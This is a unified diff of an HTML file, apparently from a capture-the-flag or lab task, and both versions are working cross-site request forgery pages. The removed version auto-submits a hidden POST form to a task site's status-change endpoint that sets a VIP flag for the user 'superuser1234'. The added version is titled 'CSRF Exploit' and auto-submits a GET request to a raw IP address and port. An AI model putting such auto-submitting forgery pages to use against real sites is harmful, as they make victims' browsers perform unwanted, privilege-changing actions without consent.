@@ -1,20 +1,16 @@
-<html>
-<head><title>Main page</title>
-</head>
-<body>
-
-
-<form name="f1" id="f1" method="POST" action="https://2023-task-3.migal.in/api/user/status/change/">
-            <input name="username" id="username_field" value="superuser1234" type="text">
-            <input name="is_vip" id="status_field" type="checkbox" value="True" checked="checked">
-
-        </form>
-
-</body>
-
-<script>
-window.onload = function(){
-  document.forms['f1'].submit();
-}
-</script>
-</html>
+<!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <title>CSRF Exploit</title>
+   </head>
+   <body>
+       <form id="csrf-form" action="http://84.201.175.79:8024/" method="GET">
+           <input type="hidden" name="check" value="yes">
+           <button type="submit">Send Request</button>
+       </form>
+       <script>
+           document.getElementById('csrf-form').submit();
+       </script>
+   </body>
+   </html>
